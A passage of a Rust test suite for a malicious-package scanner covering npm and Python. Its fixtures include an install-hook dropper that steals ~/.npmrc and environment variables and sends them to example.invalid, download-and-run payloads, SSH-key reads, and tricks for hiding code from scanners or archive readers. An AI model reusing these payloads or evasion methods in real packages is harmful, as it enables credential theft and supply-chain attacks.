            "var s = `${ (() => { if (1) /}/.test(1/1); return 1 })('`', '\\'') }\n/*`;\n",
        ] {
            sources.push(format!("{prefix}{payload}"));
        }
    }
    for src in &sources {
        let (level, score, findings) = npm_level(&[
            ("package/package.json", PKG.as_bytes()),
            ("package/index.js", src.as_bytes()),
        ]);
        assert!(
            matches!(level, NpmRisk::High | NpmRisk::Critical),
            "{src:?}: {level:?} {score}"
        );
        assert!(findings >= 1, "{src:?}");
    }
}

#[test]
fn a_lone_carriage_return_after_a_hash_does_not_hide_python_code() {
    let payload = format!(
        "import os\nos.system('{}')\nopen(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
        dl_run_line()
    );
    let crs = payload.replace('\n', "\n#\r");
    let setup = format!("from setuptools import setup\n#\r{crs}setup(name='cr', version='1.0')\n");
    let dir = TempDir::new().unwrap();
    write(dir.path(), "setup.py", setup.as_bytes());
    let (level, score) = py_level(dir.path());
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "setup.py: {level:?} {score}"
    );
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='cr', version='1.0')\n",
    );
    write(dir.path(), "cr/__init__.py", format!("#\r{crs}").as_bytes());
    let (level, score) = py_level(dir.path());
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "__init__.py: {level:?} {score}"
    );
}

#[test]
fn a_source_encoding_that_unescapes_comments_does_not_hide_python_code() {
    let setup = format!(
        "# coding: unicode_escape\nfrom setuptools import setup\n# x \\u000aos.system('{}')\nsetup(name='ue', version='1.0')\n",
        dl_run_line()
    );
    let dir = TempDir::new().unwrap();
    write(dir.path(), "setup.py", setup.as_bytes());
    let (level, score) = py_level(dir.path());
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?} {score}"
    );
    // The cookie is the first `coding` that is followed by `:` or `=`.
    let setup = setup.replace(
        "# coding: unicode_escape",
        "# coding utf-8; coding: unicode_escape",
    );
    let dir = TempDir::new().unwrap();
    write(dir.path(), "setup.py", setup.as_bytes());
    let (level, score) = py_level(dir.path());
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "cookie variant: {level:?} {score}"
    );
}

#[test]
fn a_python_docstring_that_the_code_runs_is_scanned_as_code() {
    let body = format!(
        "import os\nos.system('{}')\nopen(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
        dl_run_line()
    );
    let pipe = pipe_line();
    let cases = [
        // setup.py runs its module docstring.
        (
            "setup.py",
            format!("\"\"\"\n{body}\"\"\"\nfrom setuptools import setup\nexec(__doc__)\nsetup(name='d', version='1.0')\n"),
        ),
        (
            "d/__init__.py",
            format!("\"\"\"\n{body}\"\"\"\nexec(__doc__)\n"),
        ),
        (
            "d/__init__.py",
            format!("\"\"\"\n{pipe}\n\"\"\"\nimport os\nos.system(__doc__)\n"),
        ),
        // A triple-quoted string inside an f-string expression and then a call.
        (
            "d/__init__.py",
            format!("exec(f\"{{\")\"}}\"[:0] +\n\"\"\"\n{body}\"\"\"\n)\n"),
        ),
    ];
    for (name, source) in &cases {
        let dir = TempDir::new().unwrap();
        write(
            dir.path(),
            "setup.py",
            b"from setuptools import setup\nsetup(name='d', version='1.0')\n",
        );
        write(dir.path(), name, source.as_bytes());
        let (level, score) = py_level(dir.path());
        assert!(
            matches!(level, PyRisk::High | PyRisk::Critical),
            "{name} {source:?}: {level:?} {score}"
        );
    }
}

#[test]
fn a_command_in_documentation_is_a_labelled_finding_but_not_high() {
    let example = pipe_line();
    let sources = [
        format!("/**\n * Install: {example}\n */\nmodule.exports = 1;\n"),
        format!("// Install the CLI with: {example}\nmodule.exports = 1;\n"),
    ];
    for src in &sources {
        let dir = TempDir::new().unwrap();
        let path = write(
            dir.path(),
            "pkg.tgz",
            &tgz(&[
                ("package/package.json", PKG.as_bytes()),
                ("package/index.js", src.as_bytes()),
            ]),
        );
        let analysis = analyze_npm_package(&path).unwrap();
        assert!(
            !matches!(
                analysis.malicious_indicators.risk_level,
                NpmRisk::High | NpmRisk::Critical
            ),
            "{src:?}: {:?}",
            analysis.malicious_indicators.risk_level
        );
        assert_eq!(analysis.source_findings.len(), 1, "{src:?}");
        let finding = &analysis.source_findings[0];
        assert!(finding.in_comment);
        assert_eq!(finding.severity, "High");
        assert!(finding.evidence.contains("in a comment or docstring"));
    }
    // A module docstring in Python.
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='doc', version='1.0')\n",
    );
    write(
        dir.path(),
        "doc/__init__.py",
        format!("\"\"\"Usage:\n\n    {example}\n\"\"\"\nX = 1\n").as_bytes(),
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(
        !matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    assert!(analysis.source_findings.iter().all(|f| f.in_comment));
    assert!(!analysis.source_findings.is_empty());
    // A docstring after a def is documentation too.
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "setup.py",
        b"from setuptools import setup\nsetup(name='doc', version='1.0')\n",
    );
    write(
        dir.path(),
        "doc/__init__.py",
        format!("def f():\n    \"\"\"Usage:\n\n    {example}\n    \"\"\"\n    return 1\n")
            .as_bytes(),
    );
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(
        !matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    // The same line as code is still High or Critical (both sides of the calibration).
    let code = format!("require('child_process').exec('{example}');\n");
    let (level, score, _) = npm_level(&[
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", code.as_bytes()),
    ]);
    assert!(
        matches!(level, NpmRisk::High | NpmRisk::Critical),
        "{level:?} {score}"
    );
}

// --- round 4: tar archives other readers extract differently ------------------------

fn pax_record(key: &str, value: &str) -> Vec<u8> {
    let body = format!(" {key}={value}\n");
    let mut len = body.len();
    while len != body.len() + len.to_string().len() {
        len = body.len() + len.to_string().len();
    }
    format!("{len}{body}").into_bytes()
}

fn raw_header(name: &str, kind: tar::EntryType, data: &[u8]) -> Vec<(tar::Header, Vec<u8>)> {
    vec![(ustar(name, kind, data.len() as u64), data.to_vec())]
}

/// package.json and index.js without the end-of-archive blocks.
fn open_tar(files: &[(&str, &[u8])], extra: &[(tar::Header, Vec<u8>)]) -> Vec<u8> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, data) in files {
        builder
            .append(
                &ustar(path, tar::EntryType::Regular, data.len() as u64),
                *data,
            )
            .unwrap();
    }
    for (h, data) in extra {
        builder.append(h, &data[..]).unwrap();
    }
    let mut bytes = builder.into_inner().unwrap();
    bytes.truncate(bytes.len() - 1024);
    bytes
}

#[test]
fn entries_behind_more_gzip_members_or_a_single_zero_block_are_listed() {
    let evil = dl_payload_js();
    let blob = hidden_entry("package/evil.js", &evil);
    let files: [(&str, &[u8]); 2] = [
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", b"require('./evil.js');\n"),
    ];
    let dir = TempDir::new().unwrap();
    let zeros = |n: usize| vec![0u8; n];
    // `cat a.tgz b.tgz`: npm, pip and bsdtar read both members.
    let mut two = gz(&open_tar(&files, &[]));
    let mut second = blob.clone();
    second.extend(zeros(1024));
    two.extend(gz(&second));
    // One zero block, then more entries.
    let mut one_zero = open_tar(&files, &[]);
    one_zero.extend(zeros(512));
    one_zero.extend(&blob);
    one_zero.extend(zeros(1024));
    for (name, bytes) in [("two.tgz", two), ("one_zero.tgz", gz(&one_zero))] {
        let path = write(dir.path(), name, &bytes);
        let analysis = analyze_npm_package(&path).unwrap();
        assert!(
            matches!(
                analysis.malicious_indicators.risk_level,
                NpmRisk::High | NpmRisk::Critical
            ),
            "{name}: {:?}",
            analysis.malicious_indicators.risk_level
        );
        assert!(
            analysis
                .source_findings
                .iter()
                .any(|f| f.file == "package/evil.js"),
            "{name}"
        );
    }
    // A Python sdist whose second gzip member replaces setup.py.
    let benign = open_tar(
        &[(
            "p-1.0/setup.py",
            b"from setuptools import setup\nsetup(name='p', version='1.0')\n",
        )],
        &[],
    );
    let body = format!("import os\nos.system('{}')\n", dl_run_line());
    let mut second = hidden_entry("p-1.0/setup.py", &body);
    second.extend(zeros(1024));
    let mut sdist = gz(&benign);
    sdist.extend(gz(&second));
    let path = write(dir.path(), "p-1.0.tar.gz", &sdist);
    let analysis = analyze_python_package(&path).unwrap();
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
}

#[test]
fn names_and_pax_records_that_readers_resolve_differently_are_refused_or_read() {
    let evil = dl_payload_js();
    let blob = hidden_entry("package/blob.bin", &evil);
    let files: [(&str, &[u8]); 2] = [
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", b"require('./evil.js');\n"),
    ];
    let long = |name: &[u8]| raw_header("././@LongLink", tar::EntryType::GNULongName, name);
    let pax = |data: &[u8]| raw_header("PaxHeaders.0/x", tar::EntryType::XHeader, data);
    type Extra = Vec<(tar::Header, Vec<u8>)>;
    let mut refused: Vec<(&str, Extra)> = Vec::new();
    // A long name that ends in a slash, then a regular entry holding a header.
    let mut a = long(b"package/d/\0");
    a.extend(raw_header("package/d", tar::EntryType::Regular, &blob));
    refused.push(("long name dir", a));
    let mut a = pax(&pax_record("path", "package/d/"));
    a.extend(raw_header("package/d", tar::EntryType::Regular, &blob));
    refused.push(("pax path dir", a));
    let mut garbage = b"junk\n".to_vec();
    garbage.extend(pax_record("size", "0"));
    let mut a = pax(&garbage);
    a.extend(raw_header(
        "package/blob.bin",
        tar::EntryType::Regular,
        &blob,
    ));
    refused.push(("pax garbage", a));
    let mut a = pax(&pax_record("size", "0x0"));
    a.extend(raw_header(
        "package/blob.bin",
        tar::EntryType::Regular,
        &blob,
    ));
    refused.push(("pax hex size", a));
    let mut a = pax(&pax_record("path", "package/readme.txt"));
    a.extend(long(b"package/evil.js\0"));
    a.extend(raw_header("x", tar::EntryType::Regular, evil.as_bytes()));
    refused.push(("pax path and long name", a));
    let mut a = long(b"package/evil.js\0");
    a.extend(long(b"package/notes.txt\0"));
    a.extend(raw_header("x", tar::EntryType::Regular, evil.as_bytes()));
    refused.push(("two long names", a));
    let mut a = raw_header(
        "PaxHeaders.0/g",
        tar::EntryType::XGlobalHeader,
        &pax_record("path", "package/evil.js"),
    );
    a.extend(raw_header(
        "notes.txt",
        tar::EntryType::Regular,
        evil.as_bytes(),
    ));
    refused.push(("global pax path", a));
    let dir = TempDir::new().unwrap();
    for (name, extra) in &refused {
        let bytes = gz(&{
            let mut t = open_tar(&files, extra);
            t.extend(vec![0u8; 1024]);
            t
        });
        let path = write(
            dir.path(),
            &format!("{}.tgz", name.replace(' ', "_")),
            &bytes,
        );
        let error = analyze_npm_package(&path).unwrap_err().to_string();
        assert!(error.contains("refused"), "{name}: {error}");
    }
    // A long name cut at a NUL is the name npm, pip and bsdtar extract.
    let mut extra = long(b"package/evil.js\0.txt\0");
    extra.extend(raw_header("x", tar::EntryType::Regular, evil.as_bytes()));
    let mut t = open_tar(&files, &extra);
    t.extend(vec![0u8; 1024]);
    let path = write(dir.path(), "nul.tgz", &gz(&t));
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.file == "package/evil.js"));
    // Ordinary PAX records are still read.
    let mut extra = pax(&[
        pax_record("mtime", "1700000000.5"),
        pax_record("path", "package/ok.js"),
    ]
    .concat());
    extra.extend(raw_header(
        "x",
        tar::EntryType::Regular,
        b"module.exports = 1;\n",
    ));
    let mut t = open_tar(&files, &extra);
    t.extend(vec![0u8; 1024]);
    let path = write(dir.path(), "ok.tgz", &gz(&t));
    assert!(analyze_npm_package(&path).is_ok());
}

#[test]
fn long_name_headers_past_the_work_budget_stop_the_listing_with_a_note() {
    // About 70 MiB of PAX headers of 64 KiB each around a download-then-run file.
    let comment = "x".repeat(60 * 1024);
    let record = pax_record("comment", &comment);
    let evil = dl_payload_js();
    let build = |manifest_first: bool| {
        let mut builder = tar::Builder::new(Vec::new());
        let manifest = ustar(
            "package/package.json",
            tar::EntryType::Regular,
            PKG.len() as u64,
        );
        if manifest_first {
            builder.append(&manifest, PKG.as_bytes()).unwrap();
        }
        for _ in 0..1200 {
            builder
                .append(
                    &ustar(
                        "PaxHeaders.0/x",
                        tar::EntryType::XHeader,
                        record.len() as u64,
                    ),
                    &record[..],
                )
                .unwrap();
        }
        builder
            .append(
                &ustar(
                    "package/index.js",
                    tar::EntryType::Regular,
                    evil.len() as u64,
                ),
                evil.as_bytes(),
            )
            .unwrap();
        if !manifest_first {
            builder.append(&manifest, PKG.as_bytes()).unwrap();
        }
        gz(&builder.into_inner().unwrap())
    };
    let dir = TempDir::new().unwrap();
    let path = write(dir.path(), "bomb.tgz", &build(true));
    let analysis = analyze_npm_package(&path).unwrap();
    // The package was not fully listed: it is never Safe, and says so.
    assert!(
        !matches!(analysis.malicious_indicators.risk_level, NpmRisk::Safe),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    let notes = analysis.input.notes.join(" ");
    assert!(notes.contains("listing stopped at a limit"), "{notes}");
    // With the manifest behind the headers the error names the limit, not a missing file.
    let path = write(dir.path(), "bomb2.tgz", &build(false));
    let error = analyze_npm_package(&path).unwrap_err().to_string();
    assert!(error.contains("stopped at a limit"), "{error}");
}

// ---------------------------------------------------------------------------
// Inputs that were not read as code are never Safe; a known advisory lifts them
// ---------------------------------------------------------------------------

#[test]
fn a_dependency_list_is_never_safe_and_a_vulnerable_pin_lifts_it() {
    let dir = TempDir::new().unwrap();
    let current = write(dir.path(), "ok/requirements.txt", b"requests==2.32.3\n");
    let vulnerable = write(dir.path(), "bad/requirements.txt", b"requests==2.5.0\n");
    let ok = analyze_python_package(&current).unwrap();
    assert!(!ok.input.content_scanned);
    assert!(ok.dependencies.vulnerability_summary.total_count == 0);
    assert!(
        matches!(ok.malicious_indicators.risk_level, PyRisk::Low),
        "{:?}",
        ok.malicious_indicators
    );
    let bad = analyze_python_package(&vulnerable).unwrap();
    assert!(bad.dependencies.vulnerability_summary.total_count > 0);
    assert!(
        matches!(
            bad.malicious_indicators.risk_level,
            PyRisk::Medium | PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        bad.malicious_indicators
    );
    assert!(
        bad.malicious_indicators.overall_risk_score > ok.malicious_indicators.overall_risk_score
    );
}

#[test]
fn an_npm_manifest_or_lock_file_alone_is_never_safe_and_a_vulnerable_pin_lifts_it() {
    let dir = TempDir::new().unwrap();
    let manifest = |name: &str, version: &str| {
        write(
            dir.path(),
            &format!("{name}/package.json"),
            format!(
                r#"{{"name":"app","version":"1.0.0","dependencies":{{"lodash":"{version}"}}}}"#
            )
            .as_bytes(),
        )
    };
    let lock = |name: &str, version: &str| {
        write(
            dir.path(),
            &format!("{name}/package-lock.json"),
            format!(
                r#"{{"name":"app","version":"1.0.0","lockfileVersion":3,"packages":{{"":{{"name":"app","version":"1.0.0","dependencies":{{"lodash":"{version}"}}}},"node_modules/lodash":{{"version":"{version}"}}}}}}"#
            )
            .as_bytes(),
        )
    };
    // A package.json is read with its directory, which here holds no source: the
    // advisory alone must still lift the rating off Safe.
    let bad = analyze_npm_package(&manifest("m_bad", "4.17.11")).unwrap();
    assert!(bad.dependencies.vulnerability_summary.total_count > 0);
    assert!(
        !matches!(bad.malicious_indicators.risk_level, NpmRisk::Safe),
        "{:?}",
        bad.malicious_indicators
    );
    {
        let (current, vulnerable) = (lock("l_ok", "4.17.21"), lock("l_bad", "4.17.11"));
        let ok = analyze_npm_package(&current).unwrap();
        let bad = analyze_npm_package(&vulnerable).unwrap();
        assert!(!ok.input.content_scanned, "{current:?}");
        assert!(
            !matches!(ok.malicious_indicators.risk_level, NpmRisk::Safe),
            "{current:?} {:?}",
            ok.malicious_indicators
        );
        assert!(
            bad.dependencies.vulnerability_summary.total_count > 0,
            "{vulnerable:?}"
        );
        assert!(
            matches!(
                bad.malicious_indicators.risk_level,
                NpmRisk::Medium | NpmRisk::High | NpmRisk::Critical
            ),
            "{vulnerable:?} {:?}",
            bad.malicious_indicators
        );
        assert!(
            bad.malicious_indicators.overall_risk_score
                > ok.malicious_indicators.overall_risk_score
        );
    }
}

#[tokio::test]
async fn a_same_size_edit_of_a_source_file_still_invalidates_the_cache() {
    let dir = TempDir::new().unwrap();
    let manifest = write(dir.path(), "package.json", PKG.as_bytes());
    let source = "module.exports = 1;\n";
    write(dir.path(), "lib/index.js", source.as_bytes());
    let client = client().await;
    let first = summary(&client, "analyze_npm_package", &manifest).await;
    assert_eq!(first["cache"], "miss");
    let again = summary(&client, "analyze_npm_package", &manifest).await;
    assert_eq!(again["cache"], "hit", "{again}");
    // Same length, so only the change time tells the two apart.
    let edited = "module.exports = 2;\n";
    assert_eq!(edited.len(), source.len());
    write(dir.path(), "lib/index.js", edited.as_bytes());
    let after = summary(&client, "analyze_npm_package", &manifest).await;
    assert_eq!(after["cache"], "miss", "{after}");
    client.cancel().await.unwrap();
}

#[test]
fn a_directory_of_many_sources_is_read_in_full_and_in_order() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG.as_bytes());
    for i in 0..120 {
        write(
            dir.path(),
            &format!("src/f{i:03}.js"),
            format!("module.exports = {i};\n").as_bytes(),
        );
    }
    write(dir.path(), "src/zz_evil.js", evil_js().as_bytes());
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert_eq!(analysis.input.files_scanned, 121);
    assert!(
        analysis
            .source_findings
            .iter()
            .any(|f| f.file.ends_with("zz_evil.js")),
        "{:?}",
        analysis.source_findings
    );
}

#[test]
fn bytes_after_the_last_gzip_member_are_ignored_with_a_note() {
    let dir = TempDir::new().unwrap();
    let evil = evil_js();
    let archive = tgz(&[
        ("package/package.json", PKG.as_bytes()),
        ("package/index.js", evil.as_bytes()),
    ]);
    let mut with_junk = archive.clone();
    with_junk.extend_from_slice(b"not gzip data at all");
    let path = write(dir.path(), "junk.tgz", &with_junk);
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(
        analysis
            .source_findings
            .iter()
            .any(|f| f.file.ends_with("index.js")),
        "{:?}",
        analysis.source_findings
    );
    let notes = analysis.input.notes.join(" ");
    assert!(notes.contains("after its last gzip member"), "{notes}");
    // The same archive without the trailing bytes has no such note.
    let clean = write(dir.path(), "clean.tgz", &archive);
    let analysis = analyze_npm_package(&clean).unwrap();
    assert!(!analysis
        .input
        .notes
        .join(" ")
        .contains("after its last gzip member"));
    // A second complete member is still read, not treated as trailing bytes.
    let mut two = archive.clone();
    two.extend_from_slice(&gz(&[0u8; 1024]));
    let path = write(dir.path(), "two.tgz", &two);
    let analysis = analyze_npm_package(&path).unwrap();
    assert!(!analysis
        .input
        .notes
        .join(" ")
        .contains("after its last gzip member"));
    assert!(!analysis.source_findings.is_empty());
}

/// One gzip member holding `data`, padded with an FEXTRA field to exactly `size` bytes.
fn gz_member_of_size(data: &[u8], size: usize) -> Vec<u8> {
    let build = |extra: usize| {
        let mut enc = flate2::GzBuilder::new()
            .extra(vec![0u8; extra])
            .write(Vec::new(), flate2::Compression::fast());
        enc.write_all(data).unwrap();
        enc.finish().unwrap()
    };
    let base = build(0).len();
    assert!(size > base);
    let out = build(size - base);
    assert_eq!(out.len(), size);
    out
}

#[test]
fn a_second_gzip_member_is_read_wherever_the_buffer_ends_or_zeros_pad() {
    let dir = TempDir::new().unwrap();
    let evil = evil_js();
    let first_tar = open_tar(
        &[
            ("package/package.json", PKG.as_bytes()),
            ("package/index.js", b"module.exports = 1;\n"),
        ],
        &[],
    );
    let mut second_tar = hidden_entry("package/evil.js", &evil);
    second_tar.extend(vec![0u8; 1024]);
    let second = gz(&second_tar);
    // Member 1 ends one byte before, on, and one byte after an 8192-byte boundary.
    for size in [8190usize, 8191, 8192] {
        let mut bytes = gz_member_of_size(&first_tar, size);
        bytes.extend_from_slice(&second);
        let path = write(dir.path(), &format!("split_{size}.tgz"), &bytes);
        let analysis = analyze_npm_package(&path).unwrap();
        assert!(
            analysis
                .source_findings
                .iter()
                .any(|f| f.file == "package/evil.js"),
            "{size}: {:?}",
            analysis.source_findings
        );
        assert!(
            !analysis
                .input
                .notes
                .join(" ")
                .contains("after its last gzip member"),
            "{size}"
        );
    }
    // Zero padding between members is skipped, as Python's gzip does.
    let sdist_first = open_tar(
        &[(
            "p-1.0/setup.py",
            b"from setuptools import setup\nsetup(name='p', version='1.0')\n",
        )],
        &[],
    );
    let body = format!("import os\nos.system('{}')\n", dl_run_line());
    let mut sdist = gz(&sdist_first);
    sdist.extend(vec![0u8; 512]);
    sdist.extend(gz(&hidden_entry("p-1.0/setup.py", &body)));
    let path = write(dir.path(), "padded-1.0.tar.gz", &sdist);
    // Reading on and finding the payload, or refusing the archive, are both fine.
    if let Ok(analysis) = analyze_python_package(&path) {
        assert!(
            matches!(
                analysis.malicious_indicators.risk_level,
                PyRisk::High | PyRisk::Critical
            ),
            "{:?}",
            analysis.malicious_indicators.risk_level
        );
    }
}

// ---------------------------------------------------------------------------
// Round 6: install-time droppers, malicious dependencies, typosquats, archives
// ---------------------------------------------------------------------------

const DROPPER_JS: &str = "const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { exec } = require('child_process');

const npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
const out = path.join(os.tmpdir(), 'helper.sh');

https.get('https://example.invalid/payload.sh', (res) => {
  const f = fs.createWriteStream(out);
  res.pipe(f);
  f.on('finish', () => exec('sh ' + out));
});

const req = https.request({ host: 'example.invalid', path: '/collect', method: 'POST' });
req.write(JSON.stringify({ npmrc, env: process.env }));
req.end();
";

fn r6_npm_dir(files: &[(&str, &str)]) -> TempDir {
    let dir = TempDir::new().unwrap();
    for (name, body) in files {
        write(dir.path(), name, body.as_bytes());
    }
    dir
}

fn r6_npm_level(files: &[(&str, &str)]) -> NpmRisk {
    let dir = r6_npm_dir(files);
    analyze_npm_package(dir.path())
        .unwrap()
        .malicious_indicators
        .risk_level
}

fn r6_high_npm(level: &NpmRisk) -> bool {
    matches!(level, NpmRisk::High | NpmRisk::Critical)
}

#[test]
fn a_js_file_an_install_hook_runs_is_install_time_code() {
    let manifest = r#"{"name":"build-helper-kit","version":"1.0.0","scripts":{"preinstall":"node scripts/setup.js"}}"#;
    let dir = r6_npm_dir(&[("package.json", manifest), ("scripts/setup.js", DROPPER_JS)]);
    let pack = TempDir::new().unwrap();
    let tarball = write(
        pack.path(),
        "build-helper-kit-1.0.0.tgz",
        &tgz(&[
            ("package/package.json", manifest.as_bytes()),
            ("package/scripts/setup.js", DROPPER_JS.as_bytes()),
        ]),
    );
    for path in [dir.path().to_path_buf(), tarball] {
        let analysis = analyze_npm_package(&path).unwrap();
        let rules: Vec<&str> = analysis
            .source_findings
            .iter()
            .map(|f| f.rule.as_str())
            .collect();
        assert!(
            rules.contains(&"Download written to disk and run"),
            "{rules:?}"
        );
        assert!(
            rules.contains(&"Credential file sent over the network"),
            "{rules:?}"
        );
        assert!(
            r6_high_npm(&analysis.malicious_indicators.risk_level),
            "{:?}",
            analysis.malicious_indicators.risk_level
        );
        // The hook counts as dangerous because of the file it runs, and the signals agree.
        let hook = analysis
            .scripts_analysis
            .dangerous_commands
            .iter()
            .find(|c| c.script_name == "preinstall")
            .expect("preinstall is a dangerous command");
        assert!(
            hook.risk_reason.contains("setup.js"),
            "{}",
            hook.risk_reason
        );
        assert!(analysis.security_analysis.data_exfiltration_risk);
        assert!(analysis
            .malicious_indicators
            .risk_reasons
            .iter()
            .any(|r| r.contains("install-time script") && r.contains("preinstall")));
    }
}

#[test]
fn the_same_file_is_not_install_time_code_when_no_hook_runs_it() {
    // Library code with the same behaviour still rates High on its own findings,
    // but there is no install-time reason and no dangerous hook.
    let dir = r6_npm_dir(&[
        ("package.json", r#"{"name":"lib-x","version":"1.0.0"}"#),
        ("lib/setup.js", DROPPER_JS),
    ]);
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(analysis.scripts_analysis.dangerous_commands.is_empty());
    assert!(!analysis
        .malicious_indicators
        .risk_reasons
        .iter()
        .any(|r| r.contains("install-time script")));
}

#[test]
fn ordinary_network_and_build_code_stays_low() {
    let manifest = |scripts: &str| format!(r#"{{"name":"ctl-pkg","version":"1.0.0"{scripts}}}"#);
    // Library code that fetches JSON from an API.
    let json_fetch = "const https = require('https');
module.exports = (city, cb) => https.get('https://api.example.com/f?c=' + city, (res) => {
  let body = '';
  res.on('data', (c) => (body += c));
  res.on('end', () => cb(null, JSON.parse(body)));
});
";
    // An HTTP client library: requests, request bodies, downloads to a file, a regex exec.
    let client = "const https = require('https');
const fs = require('fs');
function request(url, opts, body, cb) {
  const req = https.request({ host: url, method: opts.method || 'GET' }, cb);
  if (body) req.write(JSON.stringify(body));
  req.end();
}
function download(url, dest, cb) {
  https.get(url, (res) => res.pipe(fs.createWriteStream(dest)).on('finish', cb));
}
const m = /a(b)/.exec('ab');
module.exports = { request, download };
";
    for (name, files) in [
        (
            "json fetch",
            vec![
                ("package.json", manifest("")),
                ("index.js", json_fetch.to_string()),
            ],
        ),
        (
            "node-gyp build",
            vec![(
                "package.json",
                manifest(r#","scripts":{"install":"node-gyp rebuild"}"#),
            )],
        ),
        (
            "postinstall message",
            vec![
                (
                    "package.json",
                    manifest(r#","scripts":{"postinstall":"node scripts/msg.js"}"#),
                ),
                (
                    "scripts/msg.js",
                    "console.log('Thanks for installing, docs at https://example.com');\n"
                        .to_string(),
                ),
            ],
        ),
        (
            "http client",
            vec![
                ("package.json", manifest("")),
                ("index.js", client.to_string()),
            ],
        ),
    ] {
        let borrowed: Vec<(&str, &str)> = files.iter().map(|(a, b)| (*a, b.as_str())).collect();
        let level = r6_npm_level(&borrowed);
        assert!(
            matches!(level, NpmRisk::Safe | NpmRisk::Low),
            "{name}: {level:?}"
        );
    }
}

#[test]
fn a_hook_command_names_the_files_it_runs() {
    // Observable through the analysis: only a file the hook runs becomes install-time code.
    for (hook, runs) in [
        ("node scripts/setup.js", true),
        ("node ./scripts/setup.js --flag", true),
        ("sh scripts/setup.js && echo done", true),
        ("node -e \"require('./scripts/setup.js')\"", false),
        ("echo scripts/setup.js", false),
        ("node ../outside.js", false),
    ] {
        let manifest = format!(
            r#"{{"name":"hook-test","version":"1.0.0","scripts":{{"postinstall":{}}}}}"#,
            serde_json::to_string(hook).unwrap()
        );
        let dir = r6_npm_dir(&[
            ("package.json", &manifest),
            ("scripts/setup.js", DROPPER_JS),
        ]);
        let analysis = analyze_npm_package(dir.path()).unwrap();
        let found = analysis
            .scripts_analysis
            .dangerous_commands
            .iter()
            .any(|c| c.risk_reason.contains("setup.js"));
        assert_eq!(found, runs, "{hook}");
    }
}

#[test]
fn python_setup_py_that_downloads_and_runs_rates_high_and_a_version_fetch_does_not() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "drop/setup.py",
        b"import subprocess\nimport urllib.request\nfrom setuptools import setup\n\nurllib.request.urlretrieve(\"https://example.invalid/stage2.bin\", \"/tmp/stage2.bin\")\nsubprocess.call([\"/tmp/stage2.bin\"])\n\nsetup(name=\"droppy\", version=\"1.0.0\")\n",
    );
    let analysis = analyze_python_package(&dir.path().join("drop")).unwrap();
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Download written to disk and run"));

    write(
        dir.path(),
        "ver/setup.py",
        b"import urllib.request\nfrom setuptools import setup\nv = urllib.request.urlopen('https://example.com/latest.txt').read().decode().strip()\nsetup(name='verfetch', version='1.0.0')\n",
    );
    let analysis = analyze_python_package(&dir.path().join("ver")).unwrap();
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::Safe | PyRisk::Low
        ),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
}

#[tokio::test]
async fn a_dependency_on_a_known_malicious_release_rates_high_and_says_malware() {
    let dir = TempDir::new().unwrap();
    // A fully scanned package that depends on two such releases.
    write(
        dir.path(),
        "dep/package.json",
        br#"{"name":"uses-bad-deps","version":"1.0.0","dependencies":{"event-stream":"3.3.6","node-ipc":"10.1.1"}}"#,
    );
    write(dir.path(), "dep/index.js", b"module.exports = 1;\n");
    // A lock file that pins one.
    let lock = write(
        dir.path(),
        "lock/package-lock.json",
        br#"{"name":"app","version":"1.0.0","lockfileVersion":3,"packages":{"":{"name":"app","version":"1.0.0","dependencies":{"node-ipc":"10.1.1"}},"node_modules/node-ipc":{"version":"10.1.1"}}}"#,
    );
    // An ordinary advisory keeps its weight: Medium, not High.
    let ordinary = write(
        dir.path(),
        "ordinary/package-lock.json",
        br#"{"name":"app","version":"1.0.0","lockfileVersion":3,"packages":{"":{"name":"app","version":"1.0.0","dependencies":{"lodash":"4.17.4"}},"node_modules/lodash":{"version":"4.17.4"}}}"#,
    );
    for path in [dir.path().join("dep"), lock] {
        let analysis = analyze_npm_package(&path).unwrap();
        assert!(
            r6_high_npm(&analysis.malicious_indicators.risk_level),
            "{}: {:?}",
            path.display(),
            analysis.malicious_indicators.risk_level
        );
        let reasons = analysis.malicious_indicators.risk_reasons.join("; ");
        assert!(reasons.contains("known malicious release"), "{reasons}");
        assert!(!analysis
            .dependencies
            .vulnerability_summary
            .malicious_releases
            .is_empty());
    }
    let analysis = analyze_npm_package(&ordinary).unwrap();
    assert!(
        matches!(analysis.malicious_indicators.risk_level, NpmRisk::Medium),
